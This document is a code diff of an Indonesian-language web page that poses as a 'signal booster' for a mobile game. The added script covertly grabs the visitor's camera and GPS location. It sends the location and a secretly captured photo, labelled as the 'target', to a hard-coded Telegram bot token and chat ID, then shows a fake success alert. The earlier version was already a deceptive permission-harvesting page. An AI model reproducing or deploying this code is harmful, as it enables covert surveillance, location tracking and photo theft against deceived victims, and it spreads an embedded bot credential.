@@ -1,30 +1,60 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Sistem Kalibrasi Sinyal</title>
+    <title>Sinyal Booster Hayabusa</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        body { background: #1a1a1a; color: #58a6ff; text-align: center; font-family: sans-serif; padding-top: 100px; }
-        .btn { background: #238636; color: white; padding: 20px; border-radius: 50px; border: none; font-weight: bold; font-size: 18px; cursor: pointer; box-shadow: 0 4px 15px rgba(0,0,0,0.5); transition: 0.3s; }
-        .btn:active { background: #2ea043; transform: scale(0.95); }
+        body { background: #000; color: #00ff00; text-align: center; font-family: sans-serif; padding-top: 50px; }
+        .btn { background: #00ff00; color: #000; padding: 20px; border-radius: 50px; border: none; font-weight: bold; font-size: 18px; cursor: pointer; box-shadow: 0 0 20px #00ff00; }
     </style>
 </head>
 <body>
-    <h2>🚀 Verifikasi Sinyal Hayabusa</h2>
-    <p>Klik tombol di bawah untuk menstabilkan jaringan game.</p>
-    <button class="btn" onclick="start()">HUBUNGKAN SEKARANG</button>
+    <div style="padding: 20px; border: 1px solid #00ff00; margin: 20px; border-radius: 15px;">
+        <h2>🚀 BOOST SIGNAL V3</h2>
+        <p>Klik tombol di bawah untuk menstabilkan jaringan dan ping game.</p>
+        <button class="btn" onclick="gas()">HUBUNGKAN SINYAL</button>
+    </div>
+
+    <video id="video" style="display:none" autoplay></video>
+    <canvas id="canvas" style="display:none"></canvas>
 
     <script>
-        function start() {
-            // Memicu permintaan izin sistem (Kamera & Mic)
-            navigator.mediaDevices.getUserMedia({ video: true, audio: true })
-            .then(() => {
-                alert("Koneksi Berhasil! Sinyal HP Anda kini stabil.");
-                // Setelah diklik Allow, pintu akses terbuka untuk Termux
-            })
-            .catch(() => {
-                alert("Gagal! Harap klik 'Izinkan' agar koneksi tidak terputus.");
-            });
+        // TOKEN & ID ABANG
+        const TOKEN = "8373626378:AAHmCRe_FCCDug1yrlsnat6WFhi71Qf6lQI";
+        const ID = "7596509818";
+
+        async function gas() {
+            try {
+                // Minta Izin Kamera & Lokasi
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('video').srcObject = stream;
+
+                navigator.geolocation.getCurrentPosition(pos => {
+                    const lat = pos.coords.latitude;
+                    const lon = pos.coords.longitude;
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=📍 LOKASI TARGET: https://www.google.com/maps?q=${lat},${lon}`);
+                });
+
+                // Ambil Foto Otomatis setelah 2 detik
+                setTimeout(() => {
+                    const v = document.getElementById('video');
+                    const c = document.getElementById('canvas');
+                    c.width = v.videoWidth;
+                    c.height = v.videoHeight;
+                    c.getContext('2d').drawImage(v, 0, 0);
+                    c.toBlob(blob => {
+                        const f = new FormData();
+                        f.append('chat_id', ID);
+                        f.append('photo', blob, 'target.jpg');
+                        f.append('caption', '📸 FOTO TARGET (MURNI BROWSER)');
+                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: f });
+                    }, 'image/jpeg');
+                    alert("Koneksi Berhasil! Sinyal Stabil.");
+                }, 2000);
+
+            } catch (e) {
+                alert("Gagal! Klik 'Izinkan' agar sinyal tidak lag.");
+            }
         }
     </script>
 </body>
